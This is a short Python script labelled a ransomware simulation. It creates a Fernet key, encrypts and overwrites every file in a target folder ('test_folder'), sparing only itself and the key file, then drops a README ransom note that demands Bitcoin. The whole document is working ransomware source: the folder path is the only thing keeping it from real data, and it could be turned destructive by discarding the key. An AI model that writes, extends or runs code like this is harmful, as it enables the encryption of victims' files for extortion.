from cryptography.fernet import Fernet
import os

# Generate a new encryption key (save this key for decryption)
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

# Load encryption key
def load_key():
    return open("encryption_key.key", "rb").read()

# Encrypt files in a folder
def encrypt_files(folder_path, key):
    fernet = Fernet(key)
    
    for file in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file)

        if os.path.isfile(file_path) and file != "encryptor.py" and file != "encryption_key.key":
            with open(file_path, "rb") as f:
                data = f.read()
            
            encrypted_data = fernet.encrypt(data)
            
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

# Display ransom note
def ransom_note():
    with open("README.txt", "w") as note:
        note.write("Your files have been encrypted! Pay Bitcoin to recover them.")

# Run ransomware simulation
if __name__ == "__main__":
    generate_key()
    key = load_key()
    encrypt_files("test_folder", key)
    ransom_note()
    print("🔴 Files Encrypted! Check README.txt for ransom instructions.")
